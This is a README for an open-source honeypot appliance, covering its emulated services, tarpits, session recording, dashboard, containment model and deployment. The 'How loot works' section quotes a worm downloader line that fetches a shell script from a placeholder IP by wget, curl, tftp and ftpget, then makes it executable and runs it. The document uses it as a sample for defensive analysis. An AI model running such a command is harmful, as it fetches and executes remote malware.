# Drosera

A zero-trust honeypot appliance. It presents a convincing small-business website
to the public, runs seven emulated protocol services underneath, wastes attacker
and bot resources with tarpits, records every session as evidence, renders those
sessions to video and sends them to you, and exposes it all through a separately
secured operator dashboard.

Nothing an attacker sends is ever executed, stored as code, or forwarded
anywhere. See [`AUTHORIZATION.md`](AUTHORIZATION.md) for the legal and ethical
basis, and for the design safeguards that make it non-weaponizable.

Built by [Digital Systems LLC](https://digitalsystems.cc) /
[Afterpacket](https://github.com/afterpacket).

## The name

*Drosera* is the genus of the sundews — carnivorous plants that catch insects
with what looks like a drop of morning dew. The name is from the Greek
*droseros*, "dewy". Each leaf is covered in tentacles tipped with a bead of
clear mucilage that glitters exactly like water, which is the entire trick: an
insect flies in for a drink and lands on glue. The tentacles then fold inward
over minutes to hours, and the plant digests at its leisure.

The whole appliance is that plant:

| Sundew | Here |
|---|---|
| Looks like water | A convincing small-business site, real-looking banners, an SSH server that accepts a weak password |
| The glue | The tarpit — a claimed 10 MB body trickled at ~3 KB/s, and an SSH version string that never arrives at all |
| Folding in slowly | Holds measured in minutes, deliberately not seconds; the cost is the attacker's time |
| Digestion | Credentials, payload hashes, NTLMv2 responses and full session recordings turned into evidence |

Sundews are also strictly passive. They grow in bogs too poor to live on, they
never chase anything, and they only ever consume what flew into them. That is
the same posture as [`AUTHORIZATION.md`](AUTHORIZATION.md): nothing here scans
back, strikes back, or reaches toward anyone. It waits, and it is patient, and
the only resource it spends is the attacker's own.

```
Internet
   │
   ├─ :80/:443 ─► nginx ─┬─► fake business site (named by your persona)
   │                     ├─► webshell emulator  (/wp-admin/admin-ajax.php)
   │                     ├─► crawler trap       (/blog/…, effectively infinite)
   │                     └─► scanner-path traps (.env, wp-config.php, backup.sql…)
   │
   ├─ :22   ─► fake sshd     (+ endlessh tarpit, SFTP quarantine, session recording)
   ├─ :21   ─► fake ftpd
   ├─ :23   ─► fake telnetd
   ├─ :25   ─► fake smtpd    (advertises an open relay, delivers nothing)
   ├─ :3306 ─► fake mysqld   (protocol v10 wire format)
   ├─ :445  ─► fake smbd     (SMB2, browsable shares, captures NTLMv2)
   ├─ :139  ─► fake smbd     (NetBIOS)
   └─ :3389 ─► fake rdpd     (X.224)

Operator only, via SSH tunnel:
   ├─ 127.0.0.1:8443 ─► dashboard (separate app, separate Redis, password + TOTP)
   └─ 127.0.0.1:5601 ─► Kibana    (own internal network, no honeypot access)

Egress side (cam-egress: no listening ports, on no other network, reached
only over the storage volume — never a socket):
   storage/sessions/*.cast ─► session-cam ─► Telegram / email / dashboard
   storage/loot/*.json      ─► intel       ─► VirusTotal (hash lookups only)

Analytics (internal only, fed off the volume rather than over the network):
   storage/logs/*.jsonl ─► elastic-shipper ─► Elasticsearch ─► Kibana
```

The asymmetry in that fourth block is the containment model in one line: the
honeypots have no route out, the egress containers have no route in, and work
crosses between them as files. `intel` in particular reads the JSON sidecars
and the hash in a filename — never a captured sample — so the one container
with internet access never opens attacker input.

## Core principle

**No legitimate traffic should ever touch this machine.** Every connection to
any port is, by construction, an alert. That premise is what lets the system be
this aggressive — and it is why you must not co-host anything real on the box.

## How it responds

Three tiers, driven by a cumulative per-IP score:

| Tier | Trigger | Response |
|---|---|---|
| 1 | Unknown visitor | Serve the convincing fake site. Log silently |
| 2 | Confirmed scanner (tool in User-Agent, or a known probe path) | Engage the tarpit: claim a 10 MB body, then trickle bytes at ~3 KB/s until they give up |
| 3 | Score ≥ 35 | Ban, and write a fail2ban line that firewalls them at the host. One last tarpit on the way out: browsers are redirected to a rickroll, and everything that ignores redirects — which is most of what gets banned — gets the same joke dripped as ASCII art, on the web and over SSH and telnet alike |

Scores accumulate across *every* service. An attacker who probes the web shell
and then tries SSH is one profile, with one consistent fake machine identity —
same hostname, same kernel, same users, same filesystem, same company name on
the website, same database credentials in the fake `wp-config.php`. Redis is
the single source of truth shared by the PHP engine and the Python services,
and [the persona](#optional-extras) supplies the constants to both halves so
they cannot drift apart.

The fake shell answers well enough to get past a worm's capability check —
`bash -c` chains are unwrapped and run, written scripts execute, and pipelined
input is processed in full — because passing that check is what convinces the
worm to go on and drop its real payload, which is [the thing actually worth
capturing](#how-loot-works).

## The session camera

Every text protocol is recorded as an [asciicast](https://docs.asciinema.org)
covering the **whole connection** — the login attempt, the credentials, the
shell if they open one, until they disconnect. Every service records. SMB and
RDP are binary protocols with no terminal to replay, so theirs are a written
account of the negotiation rather than a keystroke replay — see
[below](#every-service-records).

`session-cam` then renders finished recordings to video with a
security-camera overlay — record dot, address, service, clock, running score,
tool, and the fake hostname they were shown — and delivers them:

| Where | What arrives |
|---|---|
| Telegram | The clip, captioned with IP, score, tool and credentials tried |
| Email | Same, as an attachment |
| Dashboard | Inline playback plus the raw `.cast` |
| Webhook | Metadata only |

It also tails the event log and sends a **live alert the moment someone opens a
shell**, rather than waiting for the clip. That alerting lives in `session-cam`
because it is the only container with internet access — the honeypots have
none, by design, so anything they tried to send would go nowhere.

Recording is deliberately generous and delivery is gated: clips are only sent
past a score, content and frame floor, so a port scan does not become a
notification.

**The clip is the whole session, not a highlight.** Every frame is rendered —
sampling to a fixed budget used to drop the middle of any long session, which
is usually the part worth watching, and nothing in the clip showed that it had.
What is still compressed is dead air: gaps over `CAM_MAX_IDLE_SECONDS` are
squeezed, because a tarpitted session can idle for half an hour and that is
silence rather than content. The HUD clock keeps showing true elapsed time, so
the footage never misrepresents how long they were held.

That is affordable because delivery is MP4 by default: a full session as a GIF
runs to tens of megabytes and would be dropped at `CAM_MAX_CLIP_MB`, while the
same frames as H.264 land well inside Telegram's 50 MB limit. `ffmpeg` ships in
the `session-cam` image for exactly this. Without it the renderer falls back to
a frame-capped GIF — still delivered, but an excerpt.

## Zero-trust guarantees

- No `exec`/`system`/`shell_exec`/`popen`/`eval` on anything, in any language
- No attacker string ever reaches a real path, shell argument, or DB connection
- Uploads are hashed for evidence, then `unlink`ed immediately
- All simulated state lives in Redis; the only disk writes are appends to fixed
  paths under `storage/`, which nginx never serves
- Every container: non-root (UID 1000), read-only rootfs, all capabilities
  dropped, `no-new-privileges`, setuid binaries stripped, memory and PID capped
- Every writable path — tmpfs and the captured-data mount — is
  `noexec,nosuid,nodev`, so there is nowhere to stage or run a payload
- **No egress from the honeypot** — enforced by DOCKER-USER firewall rules that
  drop anything the honeypot subnet originates outbound, while allowing replies
  to inbound connections. Not by `internal: true`: Docker refuses to publish
  ports on an internal network, which would leave every honeypot unreachable.
  `deploy/smoke-test.sh` asserts this in both directions rather than trusting it
- **One container has internet access** — `session-cam`, which delivers clips
  and alerts. It is on no other network and receives recordings through the
  storage volume, so a compromised honeypot gains no route out through it, and a
  compromised camera gains no route in

Together those mean code execution inside a container is a dead end: nothing to
write to, nothing to execute from, nothing to fetch. See `deploy/README.md` §18
for the escape threat model and the commands to verify each control.

## When the identity store goes away

Redis holds every identity, score and ban. If it becomes unreachable the
honeypot keeps answering connections and keeps writing them to
`storage/logs/`, because that is a file and needs nothing else — but scoring,
tarpitting and banning all stop. Enforcement is gone while collection carries
on, and on a dashboard that looks exactly like a quiet day.

So it says so, in three places:

- **`IDENTITY_STORE_DEGRADED`** is written to the event log the moment it is
  detected, and again as `IDENTITY_STORE_RECOVERED` when it comes back. Both
  are in the Telegram alert set. The event log is on the filesystem, so this
  path works precisely when Redis does not.
- **The live feed** shows a banner explaining that profiles are unreachable
  rather than an empty table.
- **`./deploy/smoke-test.sh`** fails if any container cannot reach Redis.

A circuit breaker sits under all of it. The cached client keeps accepting
writes after the server has gone, so every call used to pay the full
three-second timeout before falling back — on every connection, on every
service. Slow enough to change how the honeypot behaves under load, which is a
deception failure on top of an availability one. After three consecutive
failures the breaker opens for 30 seconds and calls short-circuit straight to
the local fallback; it closes again on the first success.

The deliberate choice here is to **fail open, loudly**. Refusing connections
while Redis is down would turn a degraded honeypot into a dead one and throw
away the data that is still perfectly collectable. Tune with
`REDIS_BREAKER_FAILURES` and `REDIS_BREAKER_COOLDOWN`.

## Fail-safes

Built to survive unattended:

- Writes stop before the disk fills; a cron watchdog prunes and restarts
- Tarpit concurrency is capped below `pm.max_children`, so tarpits can never
  starve the site of its own workers
- Every tarpit has a hard deadline; the SSH honeypot sheds load past a limit
- Redis is memory-capped with LRU eviction
- Container logs are size-capped
- Unhealthy or dead containers are restarted automatically

## Dashboard

Reachable only over an SSH tunnel — it is never proxied by nginx and never
exposed to the internet.

```bash
ssh -N -L 8443:127.0.0.1:8443 -p 2222 you@your-vps
```

Password **and** TOTP are both required; the session is created only after the
TOTP step succeeds. Pages: live feed, per-IP attacker profiles with session
replay, evidence and export, charts, audit trail, settings.

The charts are inline SVG built from the same `/api/stats` payload — no chart
library, because the dashboard is reached from a box with no egress and a CDN
that fails to load leaves empty boxes with no explanation. The attack map is a
density heat map: a dot per origin answered "where is there an attacker" one at
a time, but the question the page is actually asked is where attacks
concentrate, and overlapping translucent dots are worst exactly where the
answer matters most. Origins now accumulate into a field instead of occluding
each other, drawn in a single-hue sequential ramp so colour carries magnitude
and never identity. Hovering still names the individual city and its count — a
heat bin is a neighbourhood, not a datum.

### Statistics and history

Every figure on the stats page is recomputed from that day's own log file, so
any retained day reads exactly the way today does — Redis holds current state
only and cannot tell you what Tuesday looked like. The day picker walks the
whole retention window, and a history strip across the top plots events per day;
click a bar to open that day.

**How held time is counted.** Only the closing `TARPIT_HELD` frame is summed.
The web tarpit reports progress as `TARPIT_KEEPALIVE` and emits `TARPIT_HELD`
once per connection, so a ten-minute hold counts once rather than as
10+20+30+… — an error that grows with the square of the duration.

Time is measured to the **last write the client accepted**, not to whenever the
disconnect surfaced. A client that vanishes during a pause is not discovered
until the next send fails, and counting that gap would credit the tarpit with
seconds that cost the attacker nothing. Verify against the raw log at any time:

```bash
python3 - <<'EOF'
import json, glob, gzip
secs = 0.0
for path in sorted(glob.glob('storage/logs/*.jsonl*')):
    op = gzip.open if path.endswith('.gz') else open
    with op(path, 'rt', errors='replace') as fh:
        for line in fh:
            try: r = json.loads(line)
            except Exception: continue
            if r.get('event_type') == 'TARPIT_HELD':
                secs += float(r.get('held_seconds') or 0)
print('hours wasted', round(secs / 3600, 1))
EOF
```

**Tarpit state is shared across services and re-checked mid-connection.** The
score is one number per address in Redis, so an IP pushed over the threshold by
SSH is tarpitted on SMB too. Sampling that state only at connection open left a
gap — a long share enumeration would keep getting fast answers until it
reconnected — so scored events now act on the verdict they already return.

**What ends a hold is the client's read deadline, not our ceiling.** This is
the least intuitive thing about tuning a tarpit, and the numbers say it
plainly: `SSH_TARPIT_MAX_SECONDS` was 1800 and holds were ending at 38
seconds. Two reasons, both about what the far side is measuring.

The SSH tarpit withholds the version string entirely. RFC 4253 §4.2 lets a
server send any number of lines before it, and a conforming client must skip
them and keep reading — so there is nothing for it to object to and the only
exit is its own timeout. Sending a valid banner first and junk afterwards, as
this used to, completes the version exchange and makes the next byte a protocol
error the client can act on immediately.

And a client measures *silence*, not elapsed time. Every line resets its read
deadline, so **shorter gaps hold it longer**: `SSH_TARPIT_LINE_MIN/MAX` at
1.5–4s keeps a connection alive that a 5–12s gap would lose. Widening the
interval does not make the tarpit slower, it makes it shorter.

The cost is asymmetric in the right direction — a socket and a sleeping thread
for us, a socket and a worker slot in their scan queue for them — but longer
holds mean connections *accumulate*, which is the trap. At half an hour, a
scanner reconnecting once a minute reaches thirty simultaneous slots against a
200-connection listener. `SSH_TARPIT_PER_IP` caps concurrent holds per address
so a flood costs its own source rather than our coverage of everyone else.

**Logins are not all accepted.** Accepting every credential is a one-probe
honeypot test: a scanner offers a plausible guess, then one that cannot exist
anywhere, and two successes tell it nothing here is real. `shared/credentials.py`
accepts common and guessable credentials — what a neglected box with a weak
password actually falls to — and refuses machine-generated strings, which no
administrator ever set and which is precisely why a prober picks one. Build a
per-deployment list from your own captured logins with
`deploy/extract-credentials.py`; the built-in list is published, and a published
accept-list is the weakness it defends against.

An **all-time** panel sits above the per-day view: unique addresses, addresses
blocked, events, attacker-hours wasted, countries and the busiest day across the
whole retention window. Distinct counts are unions rather than sums — an address
that came back on six days counts once, and summing the daily figures would
report six attackers where there was one, an error that grows with the retention
window rather than staying constant.

Alongside the totals: top IP and top country, the busiest service and hour,
credential attempts split into distinct usernames and passwords (the ratio is
what separates a brute force from a spray), the usernames and passwords most
tried, and two leaderboards — by score, and by volume. They answer different
questions. The top scorer did the most alarming thing; the top-volume host made
the most noise, and a steady scanner can stay under the score threshold all day
without ever appearing in the first table.

> **Note on retention:** `storage/logs/*.jsonl` is already one file per UTC day,
> so the file *is* the rotation. Never point logrotate at that tree — with
> `copytruncate` it empties each finished day in place, leaving the day listed
> in the picker but reading as zero. Retention is enforced instead by
> `deploy/watchdog.sh`, which expires whole days past `RETENTION_DAYS`.

Tables throughout are click-to-sort. IP columns sort by octet rather than
lexically — without that, `9.0.0.1` sorts after `100.0.0.1` and every /8
interleaves with every other.

### Live sessions

The live feed lists connections being recorded at this moment and lets you watch
one as it happens. It is read-only by construction: the dashboard reads the
`.cast` file another container is appending to, and there is no socket to the
honeypot and no route that sends anything toward an attacker. Watching a session
cannot become interfering with one.

<a id="every-service-records"></a>
Every interactive service is recorded — SSH, telnet, FTP, SMTP, MySQL, and now
SMB and RDP. Those two are binary protocols, so their recordings are a written
account of the negotiation (commands, share names, files opened and read, NTLM
attempts, the X.224 cookie) rather than a terminal replay, but they appear on
the dashboard and in evidence bundles like everything else.

On the web side, scanner probes and tarpit drips are recorded as well as the
webshell. Previously only webshell sessions were, which meant the live feed
showed almost nothing — probes and tarpits are the overwhelming majority of
what arrives. A scan reads back as the sequence it is: which paths, in which
order, with which user agent, then the tarpit engaging and how long the client
stayed for it. Everything one address does over HTTP shares one recording.
Set `CAM_RECORD_WEB_PROBES=false` to go back to webshell-only.

### Session playback

The honeypot writes one `.cast` per TCP connection, which is the right way to
record it and the wrong way to watch it: an attacker who reconnects nine times
becomes nine separate players. The attacker profile stitches their connections
onto a single timeline, marking each reconnection inline and collapsing the idle
time between them to two seconds — someone who came back four hours later would
otherwise leave four hours of dead air mid-recording. The player has a scrubber,
speed control, and keyboard transport (space, arrow keys). The per-connection
originals stay available underneath.

### Evidence export

Two modes, both streamed as they are built, so a large archive starts
downloading immediately instead of being assembled in memory first.

| | |
|---|---|
| **Per attacker** | Export button on any attacker profile |
| **Bulk** | Evidence page, optionally filtered by minimum score |

Each bundle holds, for one address:

| | |
|---|---|
| `report.html` | Readable summary: score breakdown, credentials, ranked commands, transcript |
| `events.jsonl` | Every logged event |
| `fail2ban.log` | Its lines from the ban log — what the firewall was told to do, and when |
| `commands.txt` / `.csv` | Every command run, merged from the session history and the event log |
| `identity.json` | The tracked identity record |
| `credentials.csv` | Usernames and passwords tried |
| `sessions/` | Every recording, plus `engagement.cast` stitching them into one timeline |
| `clips/` | Rendered video of the sessions |
| `loot/` | Quarantined payloads with their metadata |
| `MANIFEST-SHA256.txt` | Digest of every file — verify with `sha256sum -c` |

The bulk archive nests one of those per address under `attackers/` and adds
`index.csv` over all of them plus the whole `fail2ban.log`.

Commands are merged from two sources on purpose. The identity's session history
is capped and lives in Redis under a TTL, so on its own it quietly loses the
early part of a long engagement; the event log is the durable copy. They are
de-duplicated on timestamp and payload.

### Attacker profile

Headline tiles (score, status, country, first and last seen, time wasted) over a
facts column and three panels: a **service timeline** plotting scored events
against a clock in a lane per service, with dot size following the points
scored, so the moment an engagement turned serious is visible without reading a
label; **top commands** counted by executable rather than by command line, so
`cat /etc/passwd` and `cat /etc/shadow` read as one behaviour; and
**indicators**, the distinct usernames and passwords tried.

### Light and dark

A floating control in the bottom-left corner toggles the theme, and Settings
adds the "match system" option a two-state button cannot express. The preference
lives in the browser rather than on the account, and the charts read their
palette from the same CSS variables as the rest of the page, so they follow
along instead of staying dark. The session replay stays a dark terminal in both
themes — that is what the attacker saw.

## Layout

```
shared/           Python: identity, persona, scoring, alerting, tarpit,
                  loot quarantine, fake shell
persona/          This deployment's identity. Generated, gitignored
web/              nginx + PHP-FPM, public site, webshell, tarpit engine
{ssh,ftp,telnet,smtp,mysql,smb,rdp}-honey/   protocol emulators
session-cam/      renders sessions to video and delivers them
intel/            VirusTotal hash lookups for quarantined payloads
elastic/          ships events to Elasticsearch; Kibana stats
admin-dashboard/  Flask operator UI
nginx/            site config
fail2ban/         filter, jail, ufw action
deploy/           bootstrap, watchdog, logrotate, deployment guide
ssh-real/         SSH port cutover with deadman-switch rollback
```

See [`MANIFEST.md`](MANIFEST.md) for a file-by-file description.

## Deploying to a VPS

Full walkthrough in [`deploy/README.md`](deploy/README.md). The spine:

```bash
# 1. base packages
sudo apt-get update && sudo apt-get install -y ufw fail2ban logrotate git
curl -fsSL https://get.docker.com | sudo sh
sudo usermod -aG docker $USER && exit          # log back in

# 2. clone
sudo git clone <your-repo> /opt/drosera
sudo chown -R $USER:$USER /opt/drosera && cd /opt/drosera

# 3. host hardening. ADMIN_IP is YOUR address, not the VPS's -- getting this
#    wrong is the most common way to lock yourself out
sudo ADMIN_IP=203.0.113.10 ./deploy/bootstrap.sh

# 4. configure
cp .env.example .env && nano .env              # DOMAIN, WEBSHELL_ACTION

# 5. TLS: either drop a Cloudflare Origin Certificate into certs/,
#    or use the letsencrypt profile (§13 of deploy/README.md)
sudo chown 1000:1000 certs/origin.pem certs/origin.key

# 6. dashboard account -- scan the TOTP QR before dismissing it
docker compose run --rm admin-dashboard python3 setup.py

# 7. move real SSH off port 22 BEFORE starting, using the deadman switch
sudo ADMIN_IP=203.0.113.10 ./ssh-real/cutover.sh

# 8. launch
./deploy/preflight.sh
docker compose up -d --build
./deploy/smoke-test.sh
```

Sizing: **2 vCPU / 4 GB / 40 GB** runs the honeypot, tarpits, camera and
dashboard comfortably. Elasticsearch needs ~2.5 GB more — see below.

| Task | Command |
|---|---|
| Small VPS (2–4 GB) | `docker compose -f docker-compose.yml -f deploy/compose.small.yml up -d` |
| With Elasticsearch | `docker compose --profile elastic up -d` |
| With automatic TLS | `docker compose --profile letsencrypt up -d` |
| Refresh GeoIP | `./deploy/update-geoip.sh` |
| Live event feed | `tail -f storage/logs/$(date -u +%F).jsonl` |
| Bans as they fire | `tail -f storage/evidence/fail2ban.log` |
| Wipe and re-baseline | `./deploy/reset-data.sh --yes` |
| Dashboard | `ssh -N -L 8443:127.0.0.1:8443 -p 2222 you@vps` → <http://127.0.0.1:8443> |

### Updating a running deployment

Pull, rebuild, restart. Captured data lives in `storage/` and `persona/`, which
are bind-mounted and untouched by a rebuild.

```bash
cd /opt/drosera
git pull

# Re-run only if deploy/logrotate-drosera, the fail2ban jail, or the watchdog
# changed. It is idempotent, so re-running it costs nothing but a few seconds.
sudo ADMIN_IP=203.0.113.10 ./deploy/bootstrap.sh

./deploy/preflight.sh
docker compose up -d --build      # --build matters; see below
./deploy/smoke-test.sh
```

If an update requires restarting the Docker daemon, **stop the stack first**.
Destroying networks while the daemon restarts leaves stale nftables rules that
silently drop all container-to-container traffic — see Troubleshooting.

```bash
docker compose down
sudo systemctl restart docker
docker compose up -d --build
```

If `.env.example` gained keys since your `.env` was written, diff them before
restarting — a missing key falls back to a default that may not be what you
want:

```bash
diff <(grep -o '^[A-Z_]*' .env.example | sort -u) \
     <(grep -o '^[A-Z_]*' .env | sort -u)
```

To confirm the new code is actually running:

```bash
docker compose ps                             # all services Up
docker compose logs --tail=50 admin-dashboard # no tracebacks on boot
git log -1 --oneline                          # the commit you expect
```

Rolling back is `git checkout <previous-sha> && docker compose up -d --build`.

### Two rules that will save you an hour

**`restart` is almost never what you want.** Only `shared/` is bind-mounted.
Every service's own code is copied into its image at build time, so a change to
`ssh-honey/`, `telnet-honey/`, `web/`, `session-cam/`, `elastic/` or
`admin-dashboard/` needs `up -d --build`. A plain `restart` silently reuses the
old code, and the symptom is a fix that appears not to work.

Likewise `restart` does not re-read `.env` — use `up -d` for configuration
changes, and confirm with `docker compose config | grep VAR`.

**A profile flag is part of the service's identity.** `--profile elastic` /
`--profile letsencrypt` must be repeated on every `up`, `down`, `logs` and `ps`
touching those containers, or Compose behaves as though they do not exist.

## Optional extras

**Persona** — do this before going live. The engine is public, so every
observable constant shipped as source is a fingerprint: the SSH version string,
the hostname and kernel pools, the shell history, the company name on the
website, even the byte sizes in `ls -la`. Anyone with this repository can
compare a live host against the defaults and identify it in a few lines — which
is exactly why stock Cowrie is trivially detected.

```bash
./deploy/generate-persona.sh
docker compose up -d
```

That writes a randomised, gitignored `persona/persona.json` covering both
halves of the machine — `shared/persona.py` for the protocol honeypots,
`web/lib/persona.php` for the website — so the fake shell and the fake business
site tell one consistent story, and two deployments of the same release are two
different machines. `preflight.sh` warns while you are still running the
published defaults.

It also generates your **honeytokens**: the database password, API key and AWS
key ID planted in the fake `.env`, `wp-config.php` and the homepage comments.
Nothing accepts them, so if one surfaces in a credential-stuffing attempt or a
paste dump, you know which box it was scraped from — an inference that only
works while the values are yours alone.

Keep a backup alongside your `.env`. An attacker who saw one machine last week
and a different one on the same address this week has learnt something.

**Payload capture (loot)** — see [How loot works](#how-loot-works) below.

**Scan-back** — `nmap`, `masscan`, `zmap` and `rustscan` in either fake shell
ignore the target given and report on the attacker's own address, ending with
what this honeypot has actually recorded about them:

```
Host script results:
| clients-observed:
|   address: 203.0.113.44
|   first seen: 2026-07-26T11:04:12
|   sessions logged: 7
|   services probed: ssh, http, ftp
|   credentials offered: 214
|_  threat score: 47
```

Nothing is really scanned. The honeypot has no egress by design, and scanning
back would be a live port scan aimed at a third party — frequently a victim's
compromised box rather than the attacker's own machine — and would expose this
host besides. The port list is fabricated deterministically from their address;
only the observed block is real. `HONEYPOT_SCANBACK=0` turns it off, which you
may want: a careful attacker reads that block and leaves, and the rest of the
session goes with them.

**GeoIP** — country and city on every attacker, and coordinates for the Kibana
map. Needs a free [MaxMind](https://www.maxmind.com/en/geolite2/signup)
GeoLite2 database, which is licensed and cannot ship here:

```bash
# MAXMIND_ACCOUNT_ID and MAXMIND_LICENSE_KEY in .env, then
./deploy/update-geoip.sh
echo '0 4 * * 1 root /opt/drosera/deploy/update-geoip.sh' | sudo tee /etc/cron.d/drosera-geoip
```

Without it, geolocation falls back to Cloudflare's country header, which only
exists for proxied web traffic — so SSH, telnet, SMB and RDP show nothing.

**World map** — the attack map draws attack origins over a landmass outline.
Natural Earth 110m, public domain, ~100 KB:

```bash
./deploy/update-worldmap.sh
```

Unlike the GeoIP database this may be redistributed, so once fetched you can
commit `admin-dashboard/static/world.geojson` and nobody else needs to run it.
Without the file the map falls back to a lat/lon graticule — the dots are still
correctly placed, there is just no coastline behind them.

**Elasticsearch + Kibana** — T-Pot-style analytics, off by default because they
want ~2.5 GB. On a small VPS, run them somewhere else instead: copy
`storage/logs/` to a machine with spare memory and start the profile there. The
shipper reads events off the filesystem and never talks to the honeypot, so it
does not care where it runs.

**Automatic TLS** — a certbot container doing DNS-01 through Cloudflare, for
running unproxied. If you are behind Cloudflare's proxy, an Origin Certificate
is 15 years and no renewal machinery, and is the better choice.

**Telegram delivery** — set `ALERT_TELEGRAM_BOT_TOKEN` and
`ALERT_TELEGRAM_CHAT_ID`. Message the bot once first; bots cannot open a
conversation.

## Troubleshooting

Everything below was hit during a real first deployment.
[`FIXES.md`](FIXES.md) covers the bugs whose cause was nowhere near the symptom
— worth skimming before a long debugging session, since two of them look
exactly like "the database is gone".

**Every container suddenly times out reaching Redis; the dashboard shows no
attackers but the event feed keeps updating.** Stale nftables rules from a
bridge that no longer exists.

```bash
sudo ./deploy/clean-stale-nft.sh
```

Docker ≥28 writes rules into the `raw` PREROUTING chain so a published port
cannot be bypassed by addressing a container directly:

```
ip daddr 172.25.0.2 iifname != "br-4964bdc7466b" drop
```

They are meant to go with the network. Destroy a network while the daemon is
restarting — `systemctl restart docker` then `docker compose down`, say — and
they leak. The named bridge stops existing, and from then on the rule drops
*every* packet to that address, because none of them can have arrived on an
interface that is gone.

It defeats every normal diagnostic, so recognise it by the pattern rather than
by hunting:

| Looks like | Actually because |
|---|---|
| `iptables -L` shows nothing dropped | `raw` PREROUTING runs before conntrack *and* before FORWARD |
| The bridge seems healthy — ARP resolves | ARP is not IP, so the rule does not match it |
| The **host** can reach the container fine | Host traffic goes through OUTPUT, not PREROUTING |
| Adding `ACCEPT` to `DOCKER-USER` changes nothing | The packet is already gone by then |
| `tcpdump` on the veth shows the SYN, on the bridge shows nothing | Dropped at bridge ingress, between the two |

Confirm directly with `sudo nft list chain ip raw PREROUTING` — look for a rule
with a high drop count naming a `br-…` that `ip link show` cannot find.
`./deploy/smoke-test.sh` now checks for this.

**Avoid it** by stopping the stack *before* touching the daemon, never after:

```bash
docker compose down            # first
sudo systemctl restart docker  # then
docker compose up -d --build
```

**Honeypot ports are not listening.** `docker inspect <c> --format '{{json
.NetworkSettings.Ports}}'` returns `null` while `.HostConfig.PortBindings` looks
correct. Docker does not install DNAT rules for published ports on an
`internal: true` network — the config is accepted and silently does nothing.
`honeypot-internal` is therefore a normal bridge, and egress is denied by
DOCKER-USER rules that `bootstrap.sh` installs. Re-run bootstrap after any pull
that touches it.

**SSH won't move off port 22.** `sshd -T` reports both ports, `ss` shows only
one, and the listener has backlog 4096 rather than 128. That is systemd's
socket, not sshd: Ubuntu 24.04+ uses socket activation, under which `Port`
directives in `sshd_config` are ignored entirely.

```bash
sudo systemctl disable --now ssh.socket && sudo systemctl mask ssh.socket
sudo systemctl enable --now ssh.service
```

`mask` matters — `disable` alone lets a package upgrade bring it back.

**Locked out after running bootstrap.** `ADMIN_IP=$(curl -s ifconfig.me)`
executed *on the VPS* resolves to the VPS's own address, so ufw allows 2222 from
the box and nobody else. Symptom is a connection timeout (a drop) rather than a
refusal. Get the value from your own machine, or `echo "${SSH_CLIENT%% *}"` on
an existing session.

**Dashboard returns "Forbidden".** `allowed_ips` defaults to `127.0.0.1`, but
docker-proxy rewrites the source to the bridge gateway, so Flask sees
`172.x.x.x`. Add `"172.*"` to `admin-dashboard/config/admin-config.json`. Not a
loosening — the port is bound to loopback on the host regardless.

**`hp-web` restart-loops.** Two causes, both about the read-only rootfs:
php-fpm's *global* config logging to `/var/log/php8.1-fpm.log`, and `/run`
mounting root-owned when `mode=1777` is missing. Both are fixed in-tree; check
`docker logs hp-web` for which one you are seeing.

**nginx claims to load the certificate then dies.** The entrypoint's existence
check passes on a file it cannot read — `stat` needs no read permission. A
certificate created with `sudo` is `root:root 0600` and unreadable to UID 1000:

```bash
sudo chown 1000:1000 certs/origin.pem certs/origin.key
```

**Scripts are "Permission denied" after `git pull`.** Exec bits are now set in
the git index, so this is fixed — but a local `chmod +x` is itself a tracked
change and will block the next merge. `git checkout -- .` before pulling.

**`.env` changes have no effect.** `docker compose restart` reuses the existing
container environment. Use `up -d` (add `--force-recreate` if in doubt), and
confirm with `docker compose config | grep VAR`.

**Certificate stays on the staging CA.** `--keep-until-expiring` sees a valid
certificate and declines to reissue, even though nothing trusts it. Set
`LETSENCRYPT_STAGING=false`, verify with `docker compose config`, then
`certbot delete --cert-name <domain>` before recreating.

**Few session recordings, and short ones.** A tarpitted IP never reaches the
session handler, so a low `HONEYPOT_TARPIT_THRESHOLD` means you tarpit exactly
the attackers worth watching. Raise it to ~20. Beyond that, most short clips are
genuine: credential-validation bots log in, read the prompt, and leave. A
three-line cast is a complete `ssh host '<cmd>'` session — banner, command,
output.

**A fix appears not to work.** Check you rebuilt rather than restarted (see the
two rules above). The recording's *filename timestamp* is a quick way to tell
old captures from new: it is stamped when the recorder opened, so a cast created
before a change will still show the old behaviour forever.

**You tarpit or ban yourself.** Browsing your own site scores you like anyone
else. Put your address in `HONEYPOT_IGNORE_IPS` (comma-separated) — ignored
addresses are never scored, tarpitted or banned, and stay out of the statistics,
but still record normally so you can test. Already flagged? Clear it:

```bash
MD5=$(printf '%s' "203.0.113.10" | md5sum | cut -d' ' -f1)
docker exec hp-redis-honeypot redis-cli DEL "hp:identity:$MD5" "hp:banned:$MD5"
```

A blank terminal when you connect to your own honeypot is the SSH tarpit
working — it drips the version banner one byte per second, so the client waits
forever for a complete string.

**Ad-hoc log analysis under-counts.** The event log has two producers, PHP and
Python, and until recently they wrote different JSON spacing — `"service":"web"`
versus `"service": "web"`. A grep pattern written against one skipped every line
from the other, silently. New events are uniform; log files written before the
fix still contain both. Match either way, or parse the JSON:

```bash
grep -o '"service": *"[a-z]*"' storage/logs/*.jsonl | tr -d ' ' | sort | uniq -c
```

**Clips render but never arrive.** `no channels configured` on the Sessions page
means no delivery is set up. Only `session-cam` can reach the internet; the
honeypot containers have no egress, so alerting configured for them is inert by
design.

**Dashboard charts or playback blank.** Both are self-hosted; nothing loads from
a CDN. A blank page after an update is a stale cached script — hard-refresh
(Ctrl+Shift+R).

## How loot works

"Loot" is whatever an attacker hands you: a dropper, a miner, a persistence
script, a base64 blob. It is the most valuable thing they give up, and the most
dangerous thing to have on disk. The design keeps those two facts apart.

### Second-stage loaders (and the optional fetch)

Most worms that reach the fake shell never upload anything. They run a
*downloader*:

```
cd /tmp || cd /var/run; wget http://198.51.100.9/nz.sh;
curl -O http://198.51.100.9/nz.sh; chmod 777 nz.sh; sh nz.sh;
tftp 198.51.100.9 -c get nz.sh; ftpget -v -u anonymous -p anonymous
-P 21 198.51.100.9 2.sh 2.sh
```

Nothing transfers, because the box cannot reach out. So there is no file, no
hash and nothing for VirusTotal — which for a long time meant the most common
thing this honeypot sees produced no artefact at all.

What it *does* produce is the retrieval chain: an address, a port, a path, and
four transports tried in order. **That is always extracted, needs no
configuration, and works with no egress.** Each target becomes a record under
`storage/ioc/` keyed on scheme, host, port and path, accumulating how often it
was seen and which addresses used it; a `LOADER_URL` event scores it; the
attacker profile grows a **Second-stage loaders** table; and `loaders.csv`
joins every evidence bundle. Four records come out of the line above.

